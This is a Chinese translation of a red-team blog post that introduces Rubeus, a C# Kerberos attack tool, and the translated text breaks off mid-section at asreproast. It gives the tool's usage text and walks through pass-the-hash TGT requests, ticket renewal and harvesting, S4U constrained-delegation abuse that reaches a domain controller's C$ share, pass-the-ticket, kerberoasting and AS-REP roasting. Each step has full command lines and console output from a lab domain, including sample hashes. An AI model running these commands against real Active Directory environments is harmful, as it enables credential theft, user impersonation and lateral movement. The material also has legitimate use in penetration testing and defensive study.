> 原文链接: https://www.anquanke.com//post/id/161781 


# 从 Kekeo 到 Rubeus


                                阅读量   
                                **279608**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者harmj0y ，文章来源：harmj0y.net
                                <br>原文地址：[http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/](http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0132f5b4478b55750d.jpg)](https://p3.ssl.qhimg.com/t0132f5b4478b55750d.jpg)

**译者摘要：**Kekeo 是 MimiKatz 的作者 Benjamin 的一个很棒的项目，但由于一些限制影响了它在渗透测试行业中的广泛使用。本文作者将其功能使用C#进行重写，摆脱了第三方商业库的限制，希望 Kekeo 的超赞功能能够得到大家的重视和喜爱。

Kekeo，是 [Benjamin Delpy](https://twitter.com/gentilkiwi/) 继 Mimikatz 之后开发的另一个大项目，这个代码库集成了很多很赞的功能。Benjamin 指出，将 Kekeo 从 Mimikatz 代码库独立出来的原因就是，“我讨厌编写网络相关代码；因为需要使用第三方商业代码库 ASN.1 ”。Kekeo提供的功能（包含但不限于）：
1. 使用用户 hash（rc4_hmac/aes128_cts_hmac_sha1/aes256_cts_hmac_sha1格式）请求 ticket-granting-tickets (TGTs) ，并将其注入到当前登陆session 。这提供了与 mimikatz 的 “over-pass-the-hash” 不同的选择，相比来说 kekeo 无须操作 LSASS 进程内存，也无须管理员权限;
1. 从现有的 TGT 获取 service tickets (服务票据);
1. 据我所知，除了 impacket 之外，唯一提供 S4U [约束授权滥用](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) (包括 sname 情形);
1. Smartcard 滥用函数，对此我还未完全理解：）
1. 以及更多！
但是，为什么渗透测试行业中 Kekeo 没有得到像 Mimikatz 一样的热烈欢迎呢？

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0101ec747b4f024e86.png)

部分原因在于它利用场景的细微差别，但是我认为还有两个主要原因。首先，Kekeo 与现有的 PE-loader 并未很好的兼容。我试过将其与 Invoke-ReflectivePEInjection 和 <a>@subtee 的 .NET PE loader</a> 配合使用，但却不是很成功。我想对此领域更加熟悉的人也许知道该如何正确地运行，但我就是成功不了。

第二点，Kekeo 需要一个商业 ASN.1 库。ASN.1 是 kerberos 数据流量中使用的编码方案，同时也用于其他许多地方。这意味着除非获取了这个库的商业许可，否则大部分使用者只能使用 Kekeo 的预编译发布版，而这会很容易就被 AV 盯上了。再加上之前提到的对修改的限制和与 PE loader 的兼容问题，大部分人就放弃了 Kekeo。而这太可惜了。

今天，我郑重发布 [Rubeus](https://github.com/GhostPack/Rubeus/) , Kekeo 部分功能 （并非全部）的 C# 实现版本。我一直想深入了解一下 Kerberos 的结构和交换机制，从而能更好的理解整个Kerberos系统， 而这个项目正好给我提供了一个机会。 **要明确的是：**这些技术和实现是 Benjamin 的原创，我的项目只是用另一种语言进行了重新实现。我的代码库也借鉴了 Benjamin 的那位“犯罪伙伴”， [Vincent LE TOUX](https://twitter.com/mysmartlogon), 他的知名项目 [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) 中提供了一些很赞的 C# 的 LSA 相关函数，为我节省了大量的时间。非常感谢 Benjamin 和 Vincent 开创了这个领域，并提供了很棒的代码库让我可以作为工作基础—没有他们的前期工作我的这个项目根本就不可能存在。

我想说的是，虽然有他俩提供的很好的基础，但这是我曾参与的最具技术挑战性的项目之一。我使用的 ASN.1 库比较“原始”，意味着每个 Kerberos 结构或多或少都需要自己动手实现。对于那些希望深入了解 kerberos 结构或 ASN.1 解析的同学，我唯一的警告是：“龙出没，注意。”

现在我们来进入有趣的环节：）



## Rubeus

Rubeus （以Rubeus Hagrid 鲁伯·海格命名，他曾经驯养了自己的三头狗）（译者注，这里的鲁伯·海格是《哈利波特》中的人物，而 Kerberos 的意思正是三头怪兽）是一个用于在流量和主机级别上操控 Kerberos 各种组件的工具，它兼容 C# 3.0 版本（对应.NET 3.5版本）。Rubeus 使用 [Thomas Pornin](https://github.com/pornin) 的一个名为 [DDer](https://github.com/pornin/DDer) 的 C# ASN.1 解析/编码库，该库具有“类似MIT”的许可。前面提到，Kerberos 流量使用 ASN.1 编码，要找到一个可用的（且最小的）C# ASN.1 库真是一个艰巨的任务。非常感谢 Thomas 干净又稳定的代码！

Rubeus 有一系列的 “动作” /命令 。如果没有提供参数，将会显示如下帮助信息：

```
______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


  Rubeus usage:

    Retrieve a TGT based on a user hash, optionally applying to a specific LUID or creating a /netonly process to apply the ticket to:
        Rubeus.exe asktgt /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid] [/createnetonly:C:WindowsSystem32cmd.exe] [/show]

    Renew a TGT, optionally autorenewing the ticket up to its renew-till limit:
        Rubeus.exe renew &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]

    Perform S4U constrained delegation abuse:
        Rubeus.exe s4u &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
        Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] /impersonateuser:USER /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]

    Submit a TGT, optionally targeting a specific LUID (if elevated):
        Rubeus.exe ptt &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/luid:LOGINID]

    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
        Rubeus.exe purge [/luid:LOGINID]

    Parse and describe a ticket (service ticket or TGT):
        Rubeus.exe describe &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt;

    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
        Rubeus.exe createnetonly /program:"C:WindowsSystem32cmd.exe" [/show]

    Perform Kerberoasting:
        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDNUSER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]

    Perform AS-REP "roasting" for users without preauth:
        Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]

    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
        Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]

    Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
        Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER]

    Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
        Rubeus.exe harvest [/interval:MINUTES]


  NOTE: Base64 ticket blobs can be decoded with :

      [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String
```

接下来，我将介绍每个功能，用实例来解释每个函数的操作方法和使用安全警告，以及一个或多个例子。

另外，如上所示，除非指定了/ptt 选项，Rubeus 将会按列输出 blobs 的base64编码。要使用这些 blobs 数据，最简单的方法就是将其拷贝到 Sublime/VS code 之类的编辑器中，然后将“n ”做一个搜索/替换，从而将所有内容变成一行。然后就可以将得到的 base64 blob(s) 票据传递给其他的Rubeus 函数，或者用 powershell 简单地将它们保存到磁盘 :

**[IO.File]::WriteAllBytes(“ticket.kirbi”, [Convert]::FromBase64String(“aaBASE64bd…”))**

### <a class="reference-link" name="asktgt"></a>asktgt

**asktgt ** 操作将为指定的用户和加密密钥（**/rc4** or **/aes256** ）创建原始的 AS-REQ (TGT 请求) 数据。如果没有指定 /domain 参数，则默认使用主机当前所在域，如果没有指定 /dc 参数，则使用 [DsGetDcName](https://docs.microsoft.com/en-us/windows/desktop/api/dsgetdc/nf-dsgetdc-dsgetdcnamea) 来获取主机当前所在域的域控。如果认证成功，则解析收到的 AS-REP 并将 KRB-CRED（一个包含用户 TGT 的.kirbi 文件）输出为 base64 格式的 blob。如果指定 /ptt 参数，则将执行“pass the ticket”，即将生成的 Kerberos 凭证应用于当前登陆会话。而 /luid:X 参数则将生成的票据应用于指定的登陆会话（需要管理员权限）。如果指定了 /createnetonly:X 参数，则将使用 [CreateProcessWithLogonW()](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw) 创建一个新的隐藏进程（除非指定了/show参数），其SECURITY_LOGON_TYPE被设置为9，相当于 runas /netonly。然后请求到的票据将应用于这个新的登录会话。

从操作上来说，这是 Mimikatz 的 sekurlsa::pth 命令的一个替代方案，该命令启动一个虚拟登陆会话/进程，并将提供的 hash 注入到进程中，从而启动接下来的票据交互过程。此进程将附加于 LSASS 进程并将对其内存进行操作，这个动作易被作为安全检测的特征，同时也需要管理员权限。

而在我们的实现中（或者Kekeo的tgt::ask模块里），由于我们只是将原始的 Kerberos 数据发送到当前或指定的域控上，在运行的主机上无须提升权限。我们只需要用户的正确的 rc4_hmac (**/rc4**) 或者 aes256_cts_hmac_sha1 (**/aes256**) hash ，就可以用来请求此用户的 TGT 了。

另外，还有一个操作安全说明：一次只能将一个 TGT 应用于当前登录会话。因此，使用 /ptt 选项应用新票据时会清除之前的 TGT。一个解决方法是使用 /createnetonly:X 参数， 或者使用 ptt /luid:X 来请求票据并应用于另外的登陆会话。

```
c:Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt

 ______        _
(_____       | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ | ___ | | | |/___)
| |   | |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.0.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building AS-REQ (w/ preauth) for: 'testlab.localdfm.a'
[*] Connecting to 192.168.52.100:88
[*] Sent 230 bytes
[*] Received 1537 bytes
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
    ...(snip)...

[*] Action: Import Ticket
[+] Ticket successfully imported!


C:Rubeus&gt;Rubeus.exe asktgt /user:harmj0y /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /createnetonly:C:WindowsSystem32cmd.exe

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Create Process (/netonly)

[*] Showing process : False
[+] Process         : 'C:WindowsSystem32cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4988
[+] LUID            : 6241024

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
[*] Target LUID : 6241024
[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building AS-REQ (w/ preauth) for: 'testlab.localharmj0y'
[*] Connecting to 192.168.52.100:88
[*] Sent 232 bytes
[*] Received 1405 bytes
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFFjCCBRKgAwIB...(snip)...

[*] Action: Import Ticket
[*] Target LUID: 0x5f3b00
[+] Ticket successfully imported!
```

如果未指定 /ptt 参数来将票据应用于当前登陆会话，则可以使用Rubeus的 **ptt** 命令，或者 Mimikatz 的 **kerberos::ptt** 功能，或者 Cobalt Strike 的 **kerbeos_ticket_use** 稍后再应用票据。

**注意，/luid 和 /createnetonly 参数需要管理员权限执行！**

### <a class="reference-link" name="renew"></a>renew

大多数域默认的 Kerberos 策略为 TGT 提供10小时的生命期，并具有7天的续订窗口。那这到底意味着什么呢？

当把一个用户的票据注入到 LSASS 进程时，注入的将不仅仅是 TGT，而是 [KRB-CRED 结构](https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L305-L310) （即Mimikatz语言中的.kirbi文件），其中包括了用户的TGT（用krbtgt Kerberos 服务签名密钥进行加密）和 包含了一个或多个 [KrbCredInfo](https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L323-L335) 结构的 [EncKrbCredPart](https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L314-L321) 。这些最终的结构包含一个由 TGT 请求（AS-REQ/AS-REP）返回的 [ 会话密钥](https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/KerberosV5Spec2.asn#L324) 。这个会话密钥和不透明的 TGT blob 数据结合起来，可以请求一些附加的资源。这个会话密钥默认只有10个小时的生命期，但是 TGT 默认最多有7天的续订窗口，来接收一个新的会话密钥，从而就会有一个可用的 KRB-CRED 结构。

所以，如果你有一个在10小时的有效生命期内的 .kirbi 文件（或者对应的Rubeus base64 blob），并且还在7天的续订窗口期内，就可以使用 Kekeo 或者 Rubeus 来续订 TGT ，从而重启10个小时的窗口期，延长票据的有效生命期。

这个**续订**的动作将使用指定的 /ticket:X 来建立/解析一个原始的 TGS-REQ/TGS-REP TGT 续订交换过程。这个值也可设置为一个 .kirbi 文件的 base64 编码，或者是一个磁盘上的 .kirbi 文件的路径。如果未指定 /dc 参数，则将当前主机所在域的域控作为续订流量的目标。/ptt 参数将执行 “pass-the-ticket” ，并将生成的 Kerberos 凭证用于当前登录会话 。

```
c:Rubeus&gt;Rubeus.exe renew /ticket:doIFmjCC...(snip)...

 ______        _
(_____       | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ | ___ | | | |/___)
| |   | |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.0.0

[*] Action: Renew TGT

[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building TGS-REQ renewal for: 'TESTLAB.LOCALdfm.a'
[*] Connecting to 192.168.52.100:88
[*] Sent 1500 bytes
[*] Received 1510 bytes
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

    doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg
    ...(snip)...
```

如果你想要票据在到达续订窗口之前能够自动续订，只需使用 /autorenew 参数：

```
C:Rubeus&gt;Rubeus.exe renew /ticket:doIFFj...(snip)... /autorenew

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: Auto-Renew TGT


[*] User       : harmj0y@TESTLAB.LOCAL
[*] endtime    : 9/24/2018 3:34:05 AM
[*] renew-till : 9/30/2018 10:34:05 PM
[*] Sleeping for 165 minutes (endTime-30) before the next renewal
[*] Renewing TGT for harmj0y@TESTLAB.LOCAL

[*] Action: Renew TGT

[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building TGS-REQ renewal for: 'TESTLAB.LOCALharmj0y'
[*] Connecting to 192.168.52.100:88
[*] Sent 1370 bytes
[*] Received 1378 bytes
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFFjCCBRKg...(snip)...


[*] User       : harmj0y@TESTLAB.LOCAL
[*] endtime    : 9/24/2018 8:03:55 AM
[*] renew-till : 9/30/2018 10:34:05 PM
[*] Sleeping for 269 minutes (endTime-30) before the next renewal
[*] Renewing TGT for harmj0y@TESTLAB.LOCAL
```

想更进一步的话，使用 Rubeus 的 **harvest** 函数，该功能将在系统上自动收集TGT并自动续订。

### <a class="reference-link" name="s4u"></a>s4u

限制委派这一主题很难用一小段篇幅深入地解析清楚。有关更多的背景信息，可以查看我的文章 [S4U2Pwnage](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) 和相关资源。Rubeus 的操作和 Kekeo 中的 tgs::s4u 函数几乎一样。限制委派设置现在也是 [ BloodHound 2.0 搜集的信息之一了](https://posts.specterops.io/bloodhound-2-0-bc5117c45a99).

简要来说，如果一个用户或者计算机账户在其 msds-allowedToDelegateto 字段中设置了服务主体名称（SPN），并且攻击者获取了此用户/计算机的账户hash，则这个攻击者就可以在目标主机上伪装成任何域用户或任何服务。

滥用此 TTP 的方法，首先需要配置了限制委派的账户的有效 TGT/KRB-CRED 文件。使用此账户的 NTML/RC4 或 aes256_cts_hmac_sha1 哈希，利用 **asktgt** 功能即可获取这个文件。然后在 **s4u** 操作中，使用 **/ticket** 参数指定此票据文件（base64编码的blob 或者是磁盘上的一个票据文件），以及必需的 **/impersonateuser:X** 参数来指定要仿冒的账户， **/msdsspn:SERVICE/SERVER** 参数来指定账户的 msds-allowedToDelegateTo 字段中配置的 SPN 。而 **/dc** 和 **/ptt** 参数的功能与之前的操作相同。

/**altservice** 参数利用了 [Alberto Solino](https://twitter.com/agsolino)‘s 的伟大发现，即 [ 服务名称在KRB-CRED文件中不被保护](https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more) ，只有服务器名称才被保护。这就允许我们在生成的KRB-CRED（.kirbi）文件中替换我们想要的任何服务名称。

```
c:Temptickets&gt;Rubeus.exe asktgt /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building AS-REQ (w/ preauth) for: 'testlab.localpatsy'
[*] Connecting to 192.168.52.100:88
[*] Sent 230 bytes
[*] Received 1377 bytes
[*] base64(ticket.kirbi):

      doIE+jCCBPagAwIBBaE...(snip)...

c:Temptickets&gt;Rubeus.exe s4u /ticket:C:TempTicketspatsy.kirbi /impersonateuser:dfm.a /msdsspn:ldap/primary.testlab.local /altservice:cifs /ptt

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: S4U

[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building S4U2self request for: 'TESTLAB.LOCALpatsy'
[*]   Impersonating user 'dfm.a' to target SPN 'ldap/primary.testlab.local'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Sending S4U2self request
[*] Connecting to 192.168.52.100:88
[*] Sent 1437 bytes
[*] Received 1574 bytes
[+] S4U2self success!
[*] Building S4U2proxy request for service: 'ldap/primary.testlab.local'
[*] Sending S4U2proxy request
[*] Connecting to 192.168.52.100:88
[*] Sent 2618 bytes
[*] Received 1798 bytes
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi):

      doIGujCCBragAwIBBaEDAgE...(snip)...

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

或者，如果不提供 **/ticket** 参数，**/user:X** 和 **/rc4:X** 或 **/aes256:X** 哈希（**/domain:X** 可选 ）可用于请求设置了限制委派的账户(**/user** 指定)的TGT，类似于 **asktgt** 操作，然后被用于 s4u 数据请求。

```
C:Temptickets&gt;dir \primary.testlab.localC$
The user name or password is incorrect.

C:Temptickets&gt;Rubeus.exe s4u /user:patsy /domain:testlab.local /rc4:602f5c34346bc946f9ac2c0922cd9ef6 /impersonateuser:dfm.a /msdsspn:LDAP/primary.testlab.local /altservice:cifs /ptt

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 602f5c34346bc946f9ac2c0922cd9ef6
[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building AS-REQ (w/ preauth) for: 'testlab.localpatsy'
[*] Connecting to 192.168.52.100:88
[*] Sent 230 bytes
[*] Received 1377 bytes
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE+jCCBPagAwIBBaEDAg...(snip)...

[*] Action: S4U

[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
[*] Building S4U2self request for: 'TESTLAB.LOCALpatsy'
[*]   Impersonating user 'dfm.a' to target SPN 'LDAP/primary.testlab.local'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Sending S4U2self request
[*] Connecting to 192.168.52.100:88
[*] Sent 1437 bytes
[*] Received 1574 bytes
[+] S4U2self success!
[*] Building S4U2proxy request for service: 'LDAP/primary.testlab.local'
[*] Sending S4U2proxy request
[*] Connecting to 192.168.52.100:88
[*] Sent 2618 bytes
[*] Received 1798 bytes
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi):

      doIGujCCBragAwIBBaE...(snip)...

[*] Action: Import Ticket
[+] Ticket successfully imported!

C:Temptickets&gt;dir \primary.testlab.localC$
 Volume in drive \primary.testlab.localC$ has no label.
 Volume Serial Number is A48B-4D68

 Directory of \primary.testlab.localC$

03/05/2017  05:36 PM    &lt;DIR&gt;          inetpub
08/22/2013  08:52 AM    &lt;DIR&gt;          PerfLogs
04/15/2017  06:25 PM    &lt;DIR&gt;          profiles
08/28/2018  12:51 PM    &lt;DIR&gt;          Program Files
08/28/2018  12:51 PM    &lt;DIR&gt;          Program Files (x86)
08/23/2018  06:47 PM    &lt;DIR&gt;          Temp
08/23/2018  04:52 PM    &lt;DIR&gt;          Users
08/23/2018  06:48 PM    &lt;DIR&gt;          Windows
               8 Dir(s)  40,679,706,624 bytes free
```

### <a class="reference-link" name="ptt"></a>ptt

Rubeus的 **ptt** 参数非常简单：它通过[ LsaCallAuthenticationPackage()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) API 和一个 KERB_SUBMIT_TKT_REQUEST 消息来将票据（TGT或者服务票据 .kirbi）提交给当前登录会话，或者（已获取管理员权限）使用 **/luid:X** 参数指定的登录会话。这和 Mimikatz 的 **kerberos::ptt** 函数功能相同。与其他的 Rubeus **/ticket:X** 参数一样，这个值可以是一个.kirbi文件的base64编码或是.kirbi文件的磁盘路径。

```
c:Rubeus&gt;Rubeus.exe ptt /ticket:doIFmj...(snip)...

 ______        _
(_____       | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ | ___ | | | |/___)
| |   | |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v1.0.0


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

提醒一下，一个登录会话一次只能应用一个TGT！解决方法是使用 **createnetonly** 操作启动登录类型为9的进程，然后使用 **/luid:X** 参数来将票据应用于指定的登录ID。

**请注意 /luid 参数需要管理员权限！**

### <a class="reference-link" name="purge"></a>purge

**purge** 操作将清除当前登录会话中的所有 Kerberos 票据，或者 **/luid:X** 参数指定的登录会话。此操作的功能和 Mimikatz / Kekeo 的 **Kerberos::purge** 函数或 Cobalt Strike 的 **kerberos_ticket_purge** 功能相同。

```
C:Temptickets&gt;Rubeus.exe purge

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Purge Tickets
[+] Tickets successfully purged!

C:Temptickets&gt;Rubeus.exe purge /luid:34008685

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Purge Tickets
[*] Target LUID: 0x206ee6d
[+] Tickets successfully purged!
```

**请注意 /luid 参数需要管理员权限！**

### <a class="reference-link" name="describe"></a>describe

有时你想了解一个特定的 .kirbi Kerberos 票据的详细信息。**describe** 操作使用 **/ticket:X** 参数（TGT或服务票据），对此参数指定的票据进行解析，并描述其包含的值。像其他的 **/ticket:X** 参数一样，这个参数的值可以是一个 .kirbi 文件的 base64 编码，或者一个磁盘上的 .kirbi 文件路径。

```
c:Rubeus&gt;Rubeus.exe describe /ticket:doIFmjCC...(snip)...

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Display Ticket

  UserName              :  dfm.a
  UserRealm             :  TESTLAB.LOCAL
  ServiceName           :  krbtgt
  ServiceRealm          :  TESTLAB.LOCAL
  StartTime             :  9/17/2018 6:51:00 PM
  EndTime               :  9/17/2018 11:51:00 PM
  RenewTill             :  9/24/2018 4:22:59 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  2Bpbt6YnV5PFdY7YTo2hyQ==
```

### <a class="reference-link" name="createnetonly"></a>createnetonly

**createnetonly** 操作使用 [CreateProcessWithLogonW()](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw) API 创建一个新的隐藏（除非指定了 **/show** 参数）进程，其SECURITY_LOGON_TYPE 是9（新建票据），相当于runas /netonly操作，返回这个进程的 ID 和 LUID （登录会话ID）。然后，就可以使用 **ptt /luid:X** 参数将指定的 Kerberos 票据应用于此进程，前提是已提升了权限。这样就可以防止清除当前登录会话的现有TGT。（译者注：从而实现将多个票据应用于同个登录会话）

```
C:Rubeus&gt;Rubeus.exe createnetonly /program:"C:WindowsSystem32cmd.exe"

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0


[*] Action: Create Process (/netonly)

[*] Showing process : False
[+] Process         : 'C:WindowsSystem32cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 9060
[+] LUID            : 6290874
```

### <a class="reference-link" name="Kerberoast"></a>Kerberoast

**kerberoast** 操作实现了 [SharpRoast](https://github.com/GhostPack/SharpRoast) 项目的功能。与 SharpRoast 一样，这部分功能使用了 [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) 方法，此方法是 [janky regex](https://github.com/GhostPack/SharpRoast/blob/6cdbeb0cf14fe60ae74fdc174a9e70081c2fa8c0/SharpRoast/Program.cs#L70) 。

如果没有其他参数，则当前域中所有设置了 SPN 的用户账户都将被执行 kerberoast 操作。**/spn:X** 参数可针对指定的SPN 进行操作，**/user:X** 参数可针对指定的用户进行操作，**/ou:X** 参数可针对指定的 OU 中的用户进行操作。如果要使用备用域凭据进行 kerberoasing，可以使用 **/creduser:DOMAIN.FQDNUSER** **/credpassword:PASSWORD** 参数来指定。

```
c:Rubeus&gt;Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local

   ______        _
  (_____       | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ | ___ | | | |/___)
  | |   | |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.0.0

[*] Action: Kerberoasting

[*] SamAccountName         : testuser2
[*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
[*] ServicePrincipalName   : service/host
[*] Hash                   : $krb5tgs$5$*$testlab.local$service/
```

### <a class="reference-link" name="asreproast"></a>asreproast

**asreproast** 操作和 [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) 项目的功能一致，后者使用（体积较大的） [BouncyCastle](https://www.bouncycastle.org/) 库实现类似的功能。如果一个用户没有启用 kerberos 预身份认证，则可以为此用户成功请求 AS-REP，而此结构的一个组件可以被离线破解，也就是 kerberoasting。

**/user:X** 参数是必需的，而 **/domain** 和 **/dc** 参数是可选的。如果 **/domain** 和 **/dc** 参数没有被指定，则 Rubeus 将和其他操作一样，获取系统的默认值。 [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) 项目中为此哈希类型提供了与 JohnTheRipper 兼容的破解模块。

```
